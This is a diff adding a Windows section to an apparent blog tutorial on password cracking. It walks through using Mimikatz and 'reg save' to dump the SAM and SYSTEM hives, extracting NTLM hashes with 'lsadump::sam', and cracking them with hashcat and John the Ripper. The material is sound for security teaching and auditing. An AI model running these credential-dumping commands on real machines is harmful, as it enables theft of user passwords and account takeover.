@@ -147,3 +147,59 @@ where,
 ![cracked-md5crypt-hash](https://www.hkrhasan.com/_next/image?url=%2Fstatic%2Fimages%2Flinux%2Fcracked_md5_crypt_hash.png&w=1920&q=75)
 
 **Cracked Hash:** `$1$lpLYtPKh$/HA7SY940UAXbFDiHByFb.` = `password`
+
+---
+
+## PASSWORD CRACKING OF WINDOWS OPERATING SYSTEM
+
+
+**1\. Download and Run Mimikatz**
+
+- Download Mimikatz from the official GitHub:  
+
+-  [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
+
+- Run as an Administrator 
+
+
+
+**2\. Dump NTLM Hashes from the SAM Database**
+
+Windows stores NTLM hashes in the **SAM (Security Account Manager) database**.
+
+- Dump SYSTEM & SAM Hives Using Reg Save:
+
+```
+reg save HKLM\SYSTEM C:\Users\pc\Desktop\SYSTEM
+reg save HKLM\SAM C:\Users\pc\Desktop\SAM
+```
+
+- **Enable Debug Mode** (required for some operations):
+
+```
+privilege::debug
+```
+
+-  Then extract NTLM hashes from the saved SYSTEM and SAM files:
+
+```
+lsadump::sam /system:C:\Users\pc\Desktop\SYSTEM /sam:C:\Users\pc\Desktop\SAM
+```
+
+
+
+**3\. Crack NTLM Hashes with Hashcat or John the Ripper**
+
+After extracting NTLM hashes, you can **crack them** using tools like **Hashcat** or **John the Ripper**.
+
+- Save hashes to a file (`hashes.txt`) and use **Hashcat**:
+
+```
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+- **Crack with John the Ripper**:
+
+```
+john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
